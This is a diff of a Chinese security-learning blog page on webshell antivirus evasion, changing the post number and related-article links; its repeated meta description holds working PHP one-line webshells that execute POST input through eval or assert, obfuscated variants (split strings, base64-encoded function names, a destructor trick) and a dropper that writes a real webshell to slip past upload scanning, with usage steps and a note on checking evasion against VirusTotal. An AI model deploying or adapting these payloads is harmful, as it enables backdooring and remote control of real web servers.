@@ -2,16 +2,16 @@
 <html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
 <meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="使用木马识别网站检验免杀效果：https://www.virustotal.com/gui/\n一句话木马免杀 使用eval方法 1 &lt;?php eval($_POST[&#39;cmd&#39;]);?&gt; 使用assert方法 1 &lt;?php assert($_POST[&#39;cmd&#39;]);?&gt; 写成HTML语言 1 &lt;script language=&#34;php&#34;&gt; eval($_POST[&#39;cmd&#39;]);&lt;/script&gt; call_user_func调用 1 call_user_func(assert,$_POST[&#39;cmd&#39;]); 拆分敏感字符(拆成若干部分) 1 2 $a = substr_replace(&#34;assexx&#34;,&#34;rt&#34;,4); $a($_POST[&#39;cmd&#39;]); 自定义函数 1 2 3 4 5 6 &lt;?php function fun1($a){ $a($_POST[&#39;cmd&#39;]); } fun1(assert); ?&gt; 插入无意义字符 1 2 3 4 5 6 7 &lt;?php $a = $_REQUEST[&#39;cmd&#39;];\t//接收用户通过GET/POST/COOKIE任意方式传入的参数 $b = &#39;\\n&#39;;\t//单引号会原样输出,所以这行作用就是插入无意义内容来混淆 eval($b.=$a);\t//等价于eval($b = $b.$a),php会忽略/n ?&gt; 面向对象 1 2 3 4 5 6 7 8 9 10 11 12 13 14 &lt;?php class me{ public $a = &#39;&#39;; // 定义公共属性$a，初始值为空字符串 function __destruct(){ // 定义析构函数（核心） assert(&#34;$this-&gt;a&#34;); // 析构函数触发时，执行assert，参数是对象属性$a的值 } } $obj = new me; // 实例化me类，创建对象$obj $obj-&gt;a = $_POST[&#39;cmd&#39;]; // 将用户POST传入的cmd参数赋值给对象的$a属性 ?&gt; 加密绕过(base64) 1 2 3 4 5 6 &lt;?php $a = base64_decode(&#34;YXNzZXJ0&#34;); $a($_POST[&#39;cmd&#39;]); ?&gt; 拆碎敏感字符(拆成字母) 1 2 3 4 5 6 7 8 &lt;?php $a = &#34;a&#34;.&#34;s&#34;; $b = &#34;s&#34;.&#34;e&#34;.&#34;r&#34;.&#34;t&#34;; $c = $a.$b; $c($_POST[&#39;cmd&#39;]); ?&gt; 借刀杀人 1 2 3 4 5 6 7 8 9 10 11 12 &lt;?php if(isset($_POST[&#39;file&#39;])){ $d = &#39;data&#39;; $$d = $_POST[&#39;dt&#39;];//$data $f = &#39;fp&#39;; $$f = fopen($_POST[&#39;file&#39;],&#39;wb&#39;);//$fp echo fwrite($fp,$data)?&#39;yes&#39;:&#39;no&#39;; fclose($fp); } ?&gt; 使用方法： POST内容为file=文件名.php&amp;dt=一句话木马,这样本Webshell(表面安全)会在目录下创建一个真木马,从而绕过上传中间的查杀.\n">
-<title>1.20 Webshell 免杀和正则表达式</title>
+<title>1.21 Webshell 免杀和正则表达式</title>
 
-<link rel='canonical' href='https://www.retr0.xyz/p/1.20-webshell-%E5%85%8D%E6%9D%80%E5%92%8C%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/'>
+<link rel='canonical' href='https://www.retr0.xyz/p/1.21-webshell-%E5%85%8D%E6%9D%80%E5%92%8C%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/'>
 
-<link rel="stylesheet" href="/scss/style.min.67c2cdd23260c968137443c657d1f7a9a3df6cb47c832d8909e5b1c8880a7e9c.css"><meta property='og:title' content="1.20 Webshell 免杀和正则表达式">
+<link rel="stylesheet" href="/scss/style.min.67c2cdd23260c968137443c657d1f7a9a3df6cb47c832d8909e5b1c8880a7e9c.css"><meta property='og:title' content="1.21 Webshell 免杀和正则表达式">
 <meta property='og:description' content="使用木马识别网站检验免杀效果：https://www.virustotal.com/gui/\n一句话木马免杀 使用eval方法 1 &lt;?php eval($_POST[&#39;cmd&#39;]);?&gt; 使用assert方法 1 &lt;?php assert($_POST[&#39;cmd&#39;]);?&gt; 写成HTML语言 1 &lt;script language=&#34;php&#34;&gt; eval($_POST[&#39;cmd&#39;]);&lt;/script&gt; call_user_func调用 1 call_user_func(assert,$_POST[&#39;cmd&#39;]); 拆分敏感字符(拆成若干部分) 1 2 $a = substr_replace(&#34;assexx&#34;,&#34;rt&#34;,4); $a($_POST[&#39;cmd&#39;]); 自定义函数 1 2 3 4 5 6 &lt;?php function fun1($a){ $a($_POST[&#39;cmd&#39;]); } fun1(assert); ?&gt; 插入无意义字符 1 2 3 4 5 6 7 &lt;?php $a = $_REQUEST[&#39;cmd&#39;];\t//接收用户通过GET/POST/COOKIE任意方式传入的参数 $b = &#39;\\n&#39;;\t//单引号会原样输出,所以这行作用就是插入无意义内容来混淆 eval($b.=$a);\t//等价于eval($b = $b.$a),php会忽略/n ?&gt; 面向对象 1 2 3 4 5 6 7 8 9 10 11 12 13 14 &lt;?php class me{ public $a = &#39;&#39;; // 定义公共属性$a，初始值为空字符串 function __destruct(){ // 定义析构函数（核心） assert(&#34;$this-&gt;a&#34;); // 析构函数触发时，执行assert，参数是对象属性$a的值 } } $obj = new me; // 实例化me类，创建对象$obj $obj-&gt;a = $_POST[&#39;cmd&#39;]; // 将用户POST传入的cmd参数赋值给对象的$a属性 ?&gt; 加密绕过(base64) 1 2 3 4 5 6 &lt;?php $a = base64_decode(&#34;YXNzZXJ0&#34;); $a($_POST[&#39;cmd&#39;]); ?&gt; 拆碎敏感字符(拆成字母) 1 2 3 4 5 6 7 8 &lt;?php $a = &#34;a&#34;.&#34;s&#34;; $b = &#34;s&#34;.&#34;e&#34;.&#34;r&#34;.&#34;t&#34;; $c = $a.$b; $c($_POST[&#39;cmd&#39;]); ?&gt; 借刀杀人 1 2 3 4 5 6 7 8 9 10 11 12 &lt;?php if(isset($_POST[&#39;file&#39;])){ $d = &#39;data&#39;; $$d = $_POST[&#39;dt&#39;];//$data $f = &#39;fp&#39;; $$f = fopen($_POST[&#39;file&#39;],&#39;wb&#39;);//$fp echo fwrite($fp,$data)?&#39;yes&#39;:&#39;no&#39;; fclose($fp); } ?&gt; 使用方法： POST内容为file=文件名.php&amp;dt=一句话木马,这样本Webshell(表面安全)会在目录下创建一个真木马,从而绕过上传中间的查杀.\n">
-<meta property='og:url' content='https://www.retr0.xyz/p/1.20-webshell-%E5%85%8D%E6%9D%80%E5%92%8C%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/'>
+<meta property='og:url' content='https://www.retr0.xyz/p/1.21-webshell-%E5%85%8D%E6%9D%80%E5%92%8C%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/'>
 <meta property='og:site_name' content='Retr0的小窝'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-01-21T17:13:28&#43;08:00'/><meta property='article:modified_time' content='2026-01-21T17:13:28&#43;08:00'/>
-<meta name="twitter:title" content="1.20 Webshell 免杀和正则表达式">
+<meta name="twitter:title" content="1.21 Webshell 免杀和正则表达式">
 <meta name="twitter:description" content="使用木马识别网站检验免杀效果：https://www.virustotal.com/gui/\n一句话木马免杀 使用eval方法 1 &lt;?php eval($_POST[&#39;cmd&#39;]);?&gt; 使用assert方法 1 &lt;?php assert($_POST[&#39;cmd&#39;]);?&gt; 写成HTML语言 1 &lt;script language=&#34;php&#34;&gt; eval($_POST[&#39;cmd&#39;]);&lt;/script&gt; call_user_func调用 1 call_user_func(assert,$_POST[&#39;cmd&#39;]); 拆分敏感字符(拆成若干部分) 1 2 $a = substr_replace(&#34;assexx&#34;,&#34;rt&#34;,4); $a($_POST[&#39;cmd&#39;]); 自定义函数 1 2 3 4 5 6 &lt;?php function fun1($a){ $a($_POST[&#39;cmd&#39;]); } fun1(assert); ?&gt; 插入无意义字符 1 2 3 4 5 6 7 &lt;?php $a = $_REQUEST[&#39;cmd&#39;];\t//接收用户通过GET/POST/COOKIE任意方式传入的参数 $b = &#39;\\n&#39;;\t//单引号会原样输出,所以这行作用就是插入无意义内容来混淆 eval($b.=$a);\t//等价于eval($b = $b.$a),php会忽略/n ?&gt; 面向对象 1 2 3 4 5 6 7 8 9 10 11 12 13 14 &lt;?php class me{ public $a = &#39;&#39;; // 定义公共属性$a，初始值为空字符串 function __destruct(){ // 定义析构函数（核心） assert(&#34;$this-&gt;a&#34;); // 析构函数触发时，执行assert，参数是对象属性$a的值 } } $obj = new me; // 实例化me类，创建对象$obj $obj-&gt;a = $_POST[&#39;cmd&#39;]; // 将用户POST传入的cmd参数赋值给对象的$a属性 ?&gt; 加密绕过(base64) 1 2 3 4 5 6 &lt;?php $a = base64_decode(&#34;YXNzZXJ0&#34;); $a($_POST[&#39;cmd&#39;]); ?&gt; 拆碎敏感字符(拆成字母) 1 2 3 4 5 6 7 8 &lt;?php $a = &#34;a&#34;.&#34;s&#34;; $b = &#34;s&#34;.&#34;e&#34;.&#34;r&#34;.&#34;t&#34;; $c = $a.$b; $c($_POST[&#39;cmd&#39;]); ?&gt; 借刀杀人 1 2 3 4 5 6 7 8 9 10 11 12 &lt;?php if(isset($_POST[&#39;file&#39;])){ $d = &#39;data&#39;; $$d = $_POST[&#39;dt&#39;];//$data $f = &#39;fp&#39;; $$f = fopen($_POST[&#39;file&#39;],&#39;wb&#39;);//$fp echo fwrite($fp,$data)?&#39;yes&#39;:&#39;no&#39;; fclose($fp); } ?&gt; 使用方法： POST内容为file=文件名.php&amp;dt=一句话木马,这样本Webshell(表面安全)会在目录下创建一个真木马,从而绕过上传中间的查杀.\n">
     <link rel="shortcut icon" href="/favicon.ico" />
 
@@ -373,7 +373,7 @@
 
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/p/1.20-webshell-%E5%85%8D%E6%9D%80%E5%92%8C%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/">1.20 Webshell 免杀和正则表达式</a>
+            <a href="/p/1.21-webshell-%E5%85%8D%E6%9D%80%E5%92%8C%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/">1.21 Webshell 免杀和正则表达式</a>
         </h2>
     
         
@@ -955,6 +955,32 @@
             
                 
 <article class="">
+    <a href="/p/1.22-sql%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">1.22 sql注入进阶</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/1.22.sp-%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">1.22.SP 奇技淫巧：SQL注入之数据外带</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
     <a href="/p/1.19-xss-%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB2%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
         
         
@@ -987,32 +1013,6 @@
 
         <div class="article-details">
             <h2 class="article-title">1.17 页游作弊和信息搜集</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="">
-    <a href="/p/1.16-linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">1.16 Linux应急响应</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="">
-    <a href="/p/1.15-dos%E8%A1%A5%E5%85%85%E5%92%8Cwin%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">1.15 DOS补充和Win应急响应</h2>
         </div>
     </a>
 </article>
@@ -1299,8 +1299,12 @@
         
             
         
-        发表了96篇文章 · 
-        总计131.94k字
+            
+        
+            
+        
+        发表了98篇文章 · 
+        总计139.79k字
     </section>
 
 
